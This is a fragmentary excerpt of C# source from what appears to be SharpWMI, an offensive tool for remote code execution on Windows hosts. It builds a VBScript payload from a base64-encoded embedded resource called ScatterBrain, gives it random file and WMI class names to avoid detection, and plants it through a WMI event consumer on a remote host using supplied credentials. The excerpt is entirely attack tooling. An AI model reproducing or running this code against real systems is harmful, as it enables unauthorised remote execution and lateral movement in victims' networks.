...
";
        public static string RandomString(int length)
        {
            ...
            {
                stringChars[i] = chars[random.Next(0, chars.Length - 1)];
            }
        ...
        static string FormatVBSPayload()
        {
            var random = new Random();
            int fileNameLength = random.Next(3, 12);
            string fileName = RandomString(fileNameLength) + "." + RandomString(3);
            int objectNameLength = random.Next(6, 10);
            string objectClass = RandomString(objectNameLength);
            string payload = Convert.ToBase64String((byte[])SharpWMI.Properties.Resources.ScatterBrain);
            string finalString = vbsPayload.Replace("{0}", fileName).Replace("{1}", objectClass).Replace("{2}", payload);
            //Console.WriteLine(finalString);
            Console.WriteLine("[*] VBS Payload Filename on Remote System: C:\\Windows\\Temp\\{0}", fileName);
            return finalString;
        }
        ...
        static void RemoteWMIExecuteVBS(string host, string eventName, string username, string password)
        {
            try
            {
                ...
                myEventConsumer["ScriptText"] = FormatVBSPayload();
